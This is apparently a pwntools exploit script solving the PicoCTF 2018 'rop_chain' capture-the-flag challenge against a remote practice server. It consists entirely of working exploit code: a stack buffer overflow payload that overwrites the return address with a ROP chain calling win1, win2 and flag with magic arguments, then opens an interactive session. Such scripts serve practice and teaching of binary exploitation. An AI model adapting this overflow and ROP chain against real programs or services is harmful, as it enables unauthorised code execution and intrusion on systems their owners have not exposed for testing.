from pwn import *

#sh = process("./PicoCTF_2018_rop_chain")
sh = remote("node5.buuoj.cn",26929)

win1 = 0x80485CB
win2 = 0x80485D8
flag = 0x804862B

sh.recvuntil(b"input>")
payload1 = b"a"*(0x18+4)+p32(win1)+p32(win2)+p32(flag)+p32(0xBAAAAAAD)+p32(0xDEADBAAD)
sh.sendline(payload1)

sh.interactive()
